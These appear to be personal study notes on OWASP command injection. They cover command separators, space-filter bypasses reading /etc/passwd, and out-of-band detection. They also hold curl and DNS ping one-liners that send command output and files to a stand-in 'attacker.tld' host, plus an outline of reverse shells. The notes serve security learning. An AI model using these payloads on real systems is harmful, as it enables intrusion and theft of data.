# OWASP
## Command Injection
### Basics
whenever we see a suspicious input, we fuzz it. we need to use command separators.
> Recon means try to detect the injection. *it coms from recognize*
```console
; #cut the befoce cmd
&& #run this cmd if that command is tru
| #give result of last cmd to next
|| #is or
`code here` #it open a cmd executor
$(code here) #it opens a cmd exec
{code,here} #if we cant use space
cat$IFS/etc/passwd # if we cant use space ($IFS means space)
cat ${HOME:0:1}etc${HOME:0:1}passwd # {HOME:0:1} means /
```
Out of band means use web app for in out of boundry. *for example use to web send request to another space*
it can be DNS, HTTP or ...
we use this method when doesnt return the output of the injected command. for blind.
we request to our server.
```console
; wget attecker.com
```
#### let's read
- [we hacked apple for 3 months](samcurry.net/hacking-apple/#vuln4)
- [LocalTapiola: RCE using bash command](hackerone.com/reports/303061)

### Data Exfiltration
For Data Exfiltration (extracting data) u should use these two:
- HTTP Data Exfiltration
- DNS Data Exfiltration

#### HTTP
> search request catcher to get a simple server for testing out of bound.

for sending a command or file use these two:
```console
curl https://attacker.tld -d $(cmd) # for cmd result
curl https://attacker.tld --data-binary @/etc/passwd # for sending file
```
#### DNS
>  look for dns logger to get dns requests (DNS). an example is [DNSbin](dnsbin.zhack.ca)

command is:
```console
ping -c 1 $(whoami).attacker.tld # for sending cmd result
uname -a | od -A n -t x1 | sed 's/ *//g' | while read exfil; do ping -c 1 $exfil.attacker.tld; done # for sending hexed file
```
### Reverse Shell
for reverse shell we force the target machine to connect back to attacking machine.

Procedure:
- attacker's machine listen on a port
- victim's machine connect to the port
- victim spawns a shell
- attacker will have the shell

> look at this [site](revshells.com) for get some payload.

> commix is sth like sqlmap :)


## RCE
rce means u can put code in web app.
for inline import in python u can use this:
```python
__import__('PACKAGE_NAME').FUNCTINON('ARGS')
```
